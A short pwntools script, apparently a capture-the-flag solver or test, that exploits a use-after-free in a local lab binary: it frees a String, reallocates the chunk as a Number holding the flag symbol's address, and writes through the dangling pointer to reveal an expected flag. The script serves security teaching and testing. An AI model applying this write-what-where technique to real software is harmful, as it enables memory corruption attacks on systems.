#!/usr/bin/env python3
from pathlib import Path

from pwn import ELF, context, p64, process

HERE = Path(__file__).resolve().parent
BINARY = HERE / "use_after_free"
EXPECTED = b"KSJ{USE_AFTER_FREE_AAW_VERIFIED}"

context.binary = elf = ELF(str(BINARY), checksec=False)
context.log_level = "error"
tube = process([str(BINARY)], cwd=str(HERE))

tube.sendlineafter(b"> ", b"1")
tube.sendlineafter(b"> ", b"3")

# malloc(sizeof(Number)) reuses the freed sizeof(String) chunk. The dangling
# String now interprets this integer as its char pointer.
tube.sendlineafter(b"> ", b"4")
tube.sendlineafter(b"number: ", str(elf.sym["flag"]).encode())

tube.sendlineafter(b"> ", b"2")
tube.sendlineafter(b"size: ", b"8")
tube.sendafter(b"data: ", p64(0x31337))
tube.sendlineafter(b"> ", b"5")
output = tube.recvuntil(EXPECTED, timeout=2)
assert EXPECTED in output, output
print(f"[PASS] use_after_free: dangling pointer AAW target={elf.sym['flag']:#x}")
tube.close()
